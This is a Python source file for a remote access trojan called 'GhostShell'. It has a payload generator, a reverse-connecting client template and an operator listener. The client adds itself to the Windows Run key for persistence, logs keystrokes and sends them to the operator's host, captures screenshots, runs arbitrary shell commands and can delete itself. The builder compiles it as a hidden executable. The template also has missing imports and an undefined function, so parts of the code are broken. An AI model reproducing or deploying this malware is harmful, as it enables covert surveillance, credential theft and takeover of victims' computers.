import socket
import subprocess
import os
import argparse
import threading
import sys
import platform
import time
import shutil
import base64
from pynput import keyboard
import mss
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg as reg
import platform

# === AES Encryption Functions ===
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(data, key):
    data = base64.b64decode(data)
    iv = data[:16]
    ct = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

# === Screenshot Module ===
def take_screenshot():
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # capture main screen
        screenshot = sct.grab(monitor)
        screenshot_path = 'screenshot.png'
        screenshot.save(screenshot_path)
        return screenshot_path

# === Keylogger Module ===
class Keylogger:
    def __init__(self, s):
        self.s = s
        self.log = []
        self.listener = keyboard.Listener(on_press=self.on_press)
    
    def on_press(self, key):
        try:
            self.log.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log.append(' ')
            else:
                self.log.append(f'[{key}]')

    def start(self):
        self.listener.start()
    
    def stop(self):
        self.listener.stop()

    def get_log(self):
        return ''.join(self.log)

# === Payload Template ===
CLIENT_TEMPLATE = r'''
import socket
import subprocess
import os
import sys
import platform
import time

# AES Encryption Functions
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode()

def decrypt_data(data, key):
    data = base64.b64decode(data)
    iv = data[:16]
    ct = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

def reliable_send(s, data, key):
    s.send(encrypt_data(data, key).encode())

def reliable_recv(s, key):
    data = s.recv(4096).decode()
    return decrypt_data(data, key)

# Persistent install (Windows)
def persistence():
    if platform.system() == "Windows":
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(key, "GhostShell", 0, reg.REG_SZ, sys.argv[0])

# Run Keylogger
def run_keylogger(s, key):
    from pynput import keyboard
    log = []
    def on_press(key):
        try:
            log.append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                log.append(' ')
            else:
                log.append(f'[{key}]')
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    while True:
        time.sleep(10)
        reliable_send(s, ''.join(log), key)
        log.clear()

def run():
    HOST = "{host}"
    PORT = {port}
    KEY = b"this_is_a_random_key_32bytes!"  # AES key

    # Start persistence
    persistence()

    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            break
        except:
            time.sleep(5)

    keylogger_thread = threading.Thread(target=run_keylogger, args=(s, KEY))
    keylogger_thread.start()

    while True:
        try:
            cmd = reliable_recv(s, KEY)
            if cmd == "exit":
                break
            elif cmd == "self-destruct":
                path = sys.argv[0]
                s.close()
                os.remove(path)
                break
            elif cmd == "screenshot":
                screenshot_path = take_screenshot()
                with open(screenshot_path, "rb") as f:
                    s.send(f.read())
                os.remove(screenshot_path)
            else:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                out, err = proc.communicate()
                s.sendall(out + err)
        except:
            break
    s.close()

run()
'''

# === Controller Side ===
def start_listener(port):
    server = socket.socket()
    server.bind(('', port))
    server.listen(1)
    print(f"[+] Listening on port {port}...")
    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    def recv_file(filename):
        with open(filename, "wb") as f:
            while True:
                chunk = client.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
                if len(chunk) < 4096:
                    break
        print(f"[+] File saved as {filename}")

    while True:
        try:
            cmd = input("GhostShell> ").strip()
            if cmd == "":
                continue
            client.send(cmd.encode())

            if cmd == "exit":
                break
            elif cmd == "screenshot":
                with open("screenshot.png", "wb") as f:
                    f.write(client.recv(4096))
                print("[+] Screenshot captured and saved.")
            elif cmd.startswith("download "):
                filename = cmd.split(" ", 1)[1]
                recv_file(filename)
            elif cmd.startswith("upload "):
                filename = cmd.split(" ", 1)[1]
                if os.path.exists(filename):
                    with open(filename, "rb") as f:
                        client.sendfile(f)
                    print("[+] Upload sent.")
                else:
                    print("[!] File not found.")
            else:
                data = client.recv(4096)
                print(data.decode(errors='ignore'))
        except KeyboardInterrupt:
            client.send(b"exit")
            client.close()
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            break

# === Payload Generator ===
def generate_payload(host, port, output):
    payload_code = CLIENT_TEMPLATE.format(host=host, port=port)
    with open("payload_temp.py", "w") as f:
        f.write(payload_code)
    print("[*] Payload source created.")
    try:
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_temp.py"], check=True)
        out_bin = os.path.join("dist", "payload_temp.exe" if os.name == "nt" else "payload_temp")
        shutil.move(out_bin, output)
        print(f"[+] Payload ready: {output}")
    except Exception as e:
        print(f"[!] Compilation failed: {e}")
    finally:
        cleanup()

def cleanup():
    for folder in ["build", "dist", "__pycache__"]:
        shutil.rmtree(folder, ignore_errors=True)
    for file in ["payload_temp.py", "payload_temp.spec"]:
        if os.path.exists(file):
            os.remove(file)

# === CLI ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GhostShell - Post Exploitation Toolkit")
    parser.add_argument("--generate", action="store_true", help="Generate payload")
    parser.add_argument("--listen", action="store_true", help="Start listener")
    parser.add_argument("--host", help="Host for payload to connect to")
    parser.add_argument("--port", type=int, help="Port to use")
    parser.add_argument("--output", help="Output filename for payload")

    args = parser.parse_args()

    if args.generate:
        if not (args.host and args.port and args.output):
            print("[-] Missing arguments for payload generation.")
        else:
            generate_payload(args.host, args.port, args.output)
    elif args.listen:
        if not args.port:
            print("[-] Missing port to listen on.")
        else:
            start_listener(args.port)
    else:
        parser.print_help()
